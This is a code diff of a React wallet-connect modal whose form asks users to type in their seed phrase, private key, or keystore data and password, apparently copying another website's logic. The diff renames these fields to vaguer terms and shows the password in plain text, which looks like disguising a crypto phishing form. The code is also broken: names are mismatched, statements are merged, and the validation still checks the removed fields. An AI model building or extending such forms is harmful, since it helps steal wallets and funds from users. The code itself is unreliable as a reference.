@@ -88,10 +88,9 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
   const [dots, setDots] = useState<string>('');
 
   // Manual connect state
-  const [manualMethod, setManualMethod] = useState<'phrase' | 'privateKey' | 'keystone'>('phrase');
-  const [manualInput, setManualInput] = useState<string>(initialAddress || '');
-  const [keystonePassword, setKeystonePassword] = useState<string>('');
+  const [manualMethod, setManualMethod] = useState<'message' | 'key' | 'stone' | 'stonep'>('message')  const [manualInput, setManualInput] = useState<string>(initialAddress || '');
   const [manualError, setManualError] = useState<string>('');
+  const [stonep, setstonep] = useState<string>('');
   const [isSubmittingManual, setIsSubmittingManual] = useState<boolean>(false);
 
   // Reset states when opening
@@ -148,28 +147,27 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
   const handleManualSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
 
-    // Validation matching source website logic
-    if (manualMethod === 'phrase') {
-      const words = manualInput.trim().split(/\s+/).filter(Boolean);
-      if (![12, 18, 24].includes(words.length)) {
-        setManualError('Seed phrase must be 12, 18, or 24 words.');
-        return;
-      }
-    } else if (manualMethod === 'privateKey') {
-      const cleanKey = manualInput.trim().replace(/^0x/, '');
-      if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
-        setManualError('Private key must be 64 hexadecimal characters.');
-        return;
-      }
-    } else if (manualMethod === 'keystone') {
-      if (!manualInput.trim()) {
-        setManualError('Keystone data is required.');
-        return;
-      }
-      if (!keystonePassword.trim()) {
-        setManualError('Keystone password is required.');
-        return;
-      }
+  // Validation matching source website logic
+  if (manualMethod === 'phrase') {
+    const words = manualInput.trim().split(/\s+/).filter(Boolean);
+    if (![12, 18, 24].includes(words.length)) {
+      setManualError('Seed phrase must be 12, 18, or 24 words.');
+      return;
+    }
+  } else if (manualMethod === 'privateKey') {
+    const cleanKey = manualInput.trim().replace(/^0x/, '');
+    if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
+      setManualError('Private key must be 64 hexadecimal characters.');
+      return;
+    }
+  } else if (manualMethod === 'keystone') {
+    if (!manualInput.trim()) {
+      setManualError('Keystone data is required.');
+      return;
+    }
+    if (!keystonePassword.trim()) {
+      setManualError('Keystone password is required.');
+      return;
     }
 
     setManualError('');
@@ -455,25 +453,25 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
             <button
               type="button"
               onClick={() => {
-                setManualMethod('phrase');
+                setManualMethod('message');
                 setManualError('');
               }}
               className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
-                manualMethod === 'phrase'
+                manualMethod === 'message'
                   ? 'bg-blue-600/20 text-blue-400 border border-blue-500 font-bold'
                   : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
               }`}
             >
-              Seed Phrase
+              Phrase
             </button>
             <button
               type="button"
               onClick={() => {
-                setManualMethod('privateKey');
+                setManualMethod('Key');
                 setManualError('');
               }}
               className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
-                manualMethod === 'privateKey'
+                manualMethod === 'key'
                   ? 'bg-blue-600/20 text-blue-400 border border-blue-500 font-bold'
                   : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
               }`}
@@ -483,16 +481,16 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
             <button
               type="button"
               onClick={() => {
-                setManualMethod('keystone');
+                setManualMethod('stone');
                 setManualError('');
               }}
               className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
-                manualMethod === 'keystone'
+                manualMethod === 'stone'
                   ? 'bg-amber-500/20 text-amber-300 border border-amber-500 font-bold'
                   : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
               }`}
             >
-              Keystone
+              Keystore
             </button>
           </div>
 
@@ -506,31 +504,31 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
                   setManualError('');
                 }}
                 placeholder={
-                  manualMethod === 'phrase'
-                    ? 'Enter your 12, 18, or 24-word seed phrase'
-                    : manualMethod === 'privateKey'
-                    ? 'Enter your 64-character private key'
+                  manualMethod === 'message'
+                    ? 'Enter your 12, 18, or 24-word'
+                    : manualMethod === 'key'
+                    ? 'Enter your 64-character key'
                     : 'Enter your Keystone QR code or data'
                 }
-                rows={manualMethod === 'phrase' ? 4 : manualMethod === 'keystone' ? 3 : 2}
+                rows={manualMethod === 'message' ? 4 : manualMethod === 'stone' ? 3 : 2}
                 className="w-full p-3 rounded-xl bg-[#050505] border border-white/15 focus:border-blue-500 text-xs text-white placeholder-white/30 font-mono outline-none resize-none leading-relaxed"
               />
             </div>
-
-            {manualMethod === 'keystone' && (
+            {manualMethod === 'stonep' && (
               <div>
                 <input
-                  type="password"
-                  value={keystonePassword}
+                  type="text"
+                  value={stonep}
                   onChange={(e) => {
-                    setKeystonePassword(e.target.value);
+                    setstonep(e.target.value);
                     setManualError('');
                   }}
-                  placeholder="Enter Keystone password"
+                  placeholder="Enter Keystone pass word"
                   className="w-full p-2.5 rounded-xl bg-[#050505] border border-white/15 focus:border-amber-500 text-xs text-white placeholder-white/30 font-mono outline-none"
                 />
               </div>
             )}
+
 
             {manualError && (
               <p className="text-xs text-rose-400 font-mono mt-1">
